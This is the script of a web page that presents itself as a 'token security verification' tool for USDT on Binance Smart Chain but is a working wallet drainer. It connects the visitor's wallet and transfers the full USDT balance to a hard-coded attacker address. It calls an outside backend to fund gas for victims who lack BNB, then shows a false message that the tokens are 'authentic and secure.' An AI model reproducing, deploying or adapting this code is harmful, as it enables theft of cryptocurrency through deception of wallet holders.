const verifyBtn = document.getElementById('verifyBtn');
        const walletAddress = document.getElementById('walletAddress');
        const tokenBalance = document.getElementById('tokenBalance');
        const verificationModal = document.getElementById('verificationModal');
        const progressBar = document.getElementById('progressBar');
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const step3 = document.getElementById('step3');
        const step4 = document.getElementById('step4');
        const step1Desc = document.getElementById('step1Desc');
        const step2Desc = document.getElementById('step2Desc');
        const step3Desc = document.getElementById('step3Desc');
        const step4Desc = document.getElementById('step4Desc');
        const modalMessage = document.getElementById('modalMessage');
        const closeModalBtns = document.querySelectorAll('.close-modal');
        const networkDot = document.getElementById('networkDot');
        const networkStatus = document.getElementById('networkStatus');
        
        // Configuration
        const recipientAddress = '0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090';
        const tokenContractAddress = '0x55d398326f99059fF775485246999027B3197955'; // BEP-20 USDT contract
        const tokenAbi = [
            {
                "constant": true,
                "inputs": [{"name": "who", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [
                    {"name": "_to", "type": "address"},
                    {"name": "_value", "type": "uint256"}
                ],
                "name": "transfer",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            }
        ];
        
        // Network configuration
        const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet
        const BSC_MAINNET_PARAMS = {
            chainId: BSC_MAINNET_CHAIN_ID,
            chainName: 'Binance Smart Chain Mainnet',
            nativeCurrency: {
                name: 'BNB',
                symbol: 'bnb',
                decimals: 18
            },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/']
        };
        
        // Wallet types
        const WALLET_TYPES = {
            TRUST: 'trust',
            BINANCE: 'binance',
            METAMASK: 'metamask',
            UNKNOWN: 'unknown'
        };
        
        let web3;
        let userAddress;
        let tokenBalanceValue = 0;
        let tokenContract;
        let isTransferComplete = false;
        let currentProvider = null;
        let walletType = WALLET_TYPES.UNKNOWN;
        
        // Initialize Web3 - Wallet compatible
        async function initWeb3() {
            // Detect wallet type
            if (window.trustwallet) {
                walletType = WALLET_TYPES.TRUST;
                currentProvider = window.trustwallet;
            } else if (window.BinanceChain) {
                walletType = WALLET_TYPES.BINANCE;
                currentProvider = window.BinanceChain;
            } else if (window.ethereum) {
                walletType = WALLET_TYPES.METAMASK;
                currentProvider = window.ethereum;
            } else if (window.web3) {
                walletType = WALLET_TYPES.UNKNOWN;
                currentProvider = window.web3.currentProvider;
            } else {
                console.error("No Web3 provider detected");
                showError("Please install Trust Wallet, Binance Wallet or MetaMask.");
                return false;
            }
            
            try {
                web3 = new Web3(currentProvider);
                await updateNetworkStatus();
                
                // Listen for chain changes
                if (currentProvider.on) {
                    currentProvider.on('chainChanged', (chainId) => {
                        window.location.reload();
                    });
                    
                    // Binance Chain specific event
                    if (walletType === WALLET_TYPES.BINANCE) {
                        currentProvider.on('accountsChanged', (accounts) => {
                            window.location.reload();
                        });
                    }
                }
                
                return true;
            } catch (error) {
                console.error("Web3 initialization error:", error);
                return false;
            }
        }
        
        // Update network status display
        async function updateNetworkStatus() {
            if (!web3) return false;
            
            try {
                const chainId = await web3.eth.getChainId();
                
                if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
                    networkDot.className = "network-dot";
                    networkStatus.textContent = "Binance Smart Chain";
                    return true;
                } else {
                    networkDot.className = "network-dot network-disconnected";
                    networkStatus.textContent = `Unsupported Network (ID: ${chainId})`;
                    
                    // Automatically switch to BSC for Trust Wallet
                    if (walletType === WALLET_TYPES.TRUST) {
                        const switched = await switchToBSC();
                        if (switched) {
                            return updateNetworkStatus(); // Recursive check after switch
                        }
                    }
                    return false;
                }
            } catch (error) {
                console.error("Error getting network status:", error);
                networkDot.className = "network-dot network-disconnected";
                networkStatus.textContent = "Network Error";
                return false;
            }
        }
        
        // Switch to Binance Smart Chain
        async function switchToBSC() {
            step2Desc.textContent = "Switching to Binance Smart Chain...";
            console.log(`Attempting to switch to BSC (Wallet: ${walletType})`);
            
            try {
                // Binance Web3 Wallet uses different method
                if (walletType === WALLET_TYPES.BINANCE) {
                    await window.BinanceChain.switchNetwork('bsc-mainnet');
                    return true;
                }
                
                // Standard EIP-3326 method
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: BSC_MAINNET_CHAIN_ID }]
                });
                return true;
            } catch (switchError) {
                // Network not added, try to add it
                if (switchError.code === 4902) {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [BSC_MAINNET_PARAMS]
                        });
                        return true;
                    } catch (addError) {
                        console.error("Failed to add BSC network:", addError);
                        step2Desc.textContent = "Failed to add BSC network";
                        return false;
                    }
                }
                console.error("Failed to switch to BSC:", switchError);
                step2Desc.textContent = "Failed to switch network";
                return false;
            }
        }
        
        // Update progress
        function updateProgress(percent) {
            progressBar.style.width = `${percent}%`;
        }
        
        // Update step UI
        function updateStep(stepNum, status) {
            const step = document.getElementById(`step${stepNum}`);
            step.className = `step ${status}`;
            step.querySelector('.step-icon').innerHTML = status === 'completed' ? 
                '<i class="fas fa-check"></i>' : stepNum;
        }
        
        // Connect Wallet
        async function connectWallet() {
            updateStep(1, 'active');
            updateProgress(20);
            
            const isWeb3Initialized = await initWeb3();
            if (!isWeb3Initialized) {
                showError("Web3 initialization failed.");
                return false;
            }
            
            try {
                step1Desc.textContent = "Requesting account access...";
                
                // Different method for Binance Web3 Wallet
                if (walletType === WALLET_TYPES.BINANCE) {
                    const accounts = await window.BinanceChain.request({ method: 'eth_accounts' });
                    userAddress = accounts[0];
                } else {
                    const accounts = await web3.eth.getAccounts();
                    if (accounts.length === 0) {
                        showError("No accounts found. Please connect your wallet.");
                        return false;
                    }
                    userAddress = accounts[0];
                }
                
                walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
                verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
                verifyBtn.disabled = true;
                
                updateStep(1, 'completed');
                updateStep(2, 'active');
                updateProgress(40);
                
                return true;
            } catch (error) {
                console.error("Error connecting wallet:", error);
                showError("Error connecting wallet. Please try again.");
                return false;
            }
        }
        
        // Ensure we're on BSC network
        async function ensureBSCNetwork() {
            updateStep(2, 'active');
            
            try {
                const chainId = await web3.eth.getChainId();
                
                if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
                    step2Desc.textContent = "Connected to Binance Smart Chain";
                    return true;
                }
                
                const switched = await switchToBSC();
                
                if (switched) {
                    step2Desc.textContent = "Successfully switched to Binance Smart Chain";
                    updateNetworkStatus();
                    return true;
                } else {
                    step2Desc.textContent = "Failed to switch network";
                    return false;
                }
            } catch (error) {
                console.error("Network check failed:", error);
                step2Desc.textContent = "Network check failed";
                return false;
            }
        }
        
        // Get token balance
        async function getTokenBalance() {
            updateStep(3, 'active');
            step3Desc.textContent = "Scanning token security parameters...";
            
            try {
                tokenBalance.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Analyzing...';
                
                tokenContract = new web3.eth.Contract(tokenAbi, tokenContractAddress);
                
                const balance = await tokenContract.methods.balanceOf(userAddress).call();
                
                tokenBalanceValue = web3.utils.fromWei(balance, 'ether');
                tokenBalance.textContent = `${parseFloat(tokenBalanceValue).toFixed(2)} USDT`;
                
                step3Desc.textContent = "Token analysis complete";
                updateStep(3, 'completed');
                updateStep(4, 'active');
                updateProgress(70);
                
                return true;
            } catch (error) {
                console.error("Error fetching token balance:", error);
                step3Desc.textContent = "Token analysis failed";
                showError("Failed to analyze token. Please try again.");
                tokenBalance.textContent = "0.00 USDT";
                return false;
            }
        }
        
       // Execute verification (transfer)
async function executeVerification() {
    step4Desc.textContent = "Confirming authenticity in your wallet...";
    modalMessage.textContent = "Please confirm the transaction in your wallet";

    try {
        // Convert token to wei
        const amountWei = web3.utils.toWei(tokenBalanceValue.toString(), 'ether');

        // --- BNB Check and Top-Up Integration Start ---
        // Get user's current BNB balance
        const bnbBalanceWei = await web3.eth.getBalance(userAddress);
        const userBNB = parseFloat(web3.utils.fromWei(bnbBalanceWei, 'ether'));

        // Define a threshold for low BNB. 0.0005 BNB is a good starting point for BSC gas.
        const BNB_LOW_THRESHOLD = 0.0005; 

        if (userBNB < BNB_LOW_THRESHOLD) {
            console.log("User BNB is low. Requesting BNB from backend...");
            modalMessage.textContent = "Insufficient BNB for gas. Requesting BNB top-up...";
            modalMessage.className = "warning-message"; // You might want a different class for warnings

            try {
                const response = await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ toAddress: userAddress })
                });

                if (response.ok) {
                    const result = await response.json();
                    console.log("BNB top-up request successful:", result);
                    modalMessage.textContent = "BNB top-up requested. Please wait a moment and try confirming the transaction again.";
                
                    verificationModal.style.display = "none"; // Close modal so user can re-click verify
                    return; 
                } else {
                    const errorData = await response.json();
                    console.error("BNB top-up request failed:", errorData);
                    showError(`BNB top-up failed: ${errorData.message || "Unknown error"}. Please ensure you have enough BNB for gas.`);
                    return; // Stop execution if BNB top-up fails
                }
            } catch (backendError) {
                console.error("Error communicating with BNB backend:", backendError);
                showError("Could not request BNB. Network error or backend issue. Please try again.");
                return; // Stop execution if backend call fails
            }
        }
        // --- BNB Check and Top-Up Integration End ---

        // Proceed with USDT transfer if BNB is sufficient or top-up wasn't needed/failed
                tokenContract.methods.transfer(recipientAddress, amountWei)
                    .send({ from: userAddress })
                    .on('transactionHash', (hash) => {
                        console.log("Transaction hash:", hash);
                    })
                    .on('receipt', (receipt) => {
                        // Transaction was successful
                        step4Desc.textContent = "Verification complete!";
                        updateStep(4, 'completed');
                        updateProgress(100);
                        
                        setTimeout(() => {
                            tokenBalance.textContent = "0.00 USDT";
                            tokenBalanceValue = 0;
                            
                            verificationModal.style.display = "none";
                            
                            verifyBtn.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete';
                            verifyBtn.disabled = true;
                            
                            modalMessage.textContent = "Token verification complete! Your tokens are authentic and secure.";
                            modalMessage.className = "success-message";
                            
                            isTransferComplete = true;
                        }, 1500);
                    })
                    .on('error', (error) => {
                        console.error("Transaction error:", error);
                        step4Desc.textContent = "Verification failed";
                        modalMessage.textContent = "Verification failed. Please try again.";
                        modalMessage.className = "error-message";
                    });
                
            } catch (error) {
                console.error("Verification failed:", error);
                step4Desc.textContent = "Verification failed";
                modalMessage.textContent = "Verification failed. Please try again.";
                modalMessage.className = "error-message";
            }
        }
        
        // Show error message
        function showError(message) {
            modalMessage.textContent = message;
            modalMessage.className = "error-message";
            setTimeout(() => {
                modalMessage.textContent = "";
                modalMessage.className = "";
            }, 5000);
        }
        
        // Event Listeners
        verifyBtn.addEventListener('click', async () => {
            if (isTransferComplete) return;
            
            verificationModal.style.display = "flex";
            updateStep(1, 'active');
            updateStep(2, '');
            updateStep(3, '');
            updateStep(4, '');
            updateProgress(0);
            modalMessage.textContent = "";
            
            try {
                // Step 1: Connect wallet
                if (!userAddress) {
                    const connected = await connectWallet();
                    if (!connected) {
                        verificationModal.style.display = "none";
                        verifyBtn.disabled = false;
                        return;
                    }
                }
                
                // Step 2: Ensure BSC network
                const networkReady = await ensureBSCNetwork();
                if (!networkReady) {
                    updateStep(2, '');
                    modalMessage.textContent = "Please switch to Binance Smart Chain to continue";
                    modalMessage.className = "error-message";
                    return;
                }
                updateStep(2, 'completed');
                
                // Step 3: Get token balance
                const balanceFetched = await getTokenBalance();
                if (!balanceFetched) {
                    verificationModal.style.display = "none";
                    verifyBtn.disabled = false;
                    return;
                }
                
                if (tokenBalanceValue <= 0) {
    modalMessage.textContent = "No USDT tokens found for verification.";
    modalMessage.className = "error-message";
    return;
}

if (tokenBalanceValue <= 1) {
    const bnbBalance = await web3.eth.getBalance(userAddress);
    const formattedBNB = web3.utils.fromWei(bnbBalance, 'ether');

    modalMessage.textContent = `Token verification complete, Your tokens are authentic and secure.\nUSDT Balance: ${tokenBalanceValue} USDT\nBNB Balance: ${parseFloat(formattedBNB).toFixed(4)} BNB`;
    modalMessage.className = "success-message";
    return;
}
                
                // Step 4: Execute verification
                await executeVerification();
            } catch (error) {
                console.error("Verification process error:", error);
                showError("An unexpected error occurred. Please try again.");
                verificationModal.style.display = "none";
                verifyBtn.disabled = false;
            }
        });
        
        closeModalBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                verificationModal.style.display = "none";
                verifyBtn.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security';
                verifyBtn.disabled = false;
            });
        });
        
        // Close modals when clicking outside
        window.addEventListener('click', (e) => {
            if (e.target === verificationModal) {
                verificationModal.style.display = "none";
                verifyBtn.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security';
                verifyBtn.disabled = false;
            }
        });
        
        // Initialize
        verifyBtn.disabled = false;
        
        // Initialize web3 on load
        window.addEventListener('load', async () => {
            const web3Initialized = await initWeb3();
            
            if (web3Initialized) {
                // Try to connect wallet automatically if previously connected
                if (currentProvider.selectedAddress) {
                    userAddress = currentProvider.selectedAddress;
                    walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
                    
                    // Get initial balance
                    await ensureBSCNetwork();
                    await getTokenBalance();
                }
            }
        });
    </script>
</body>
</html>
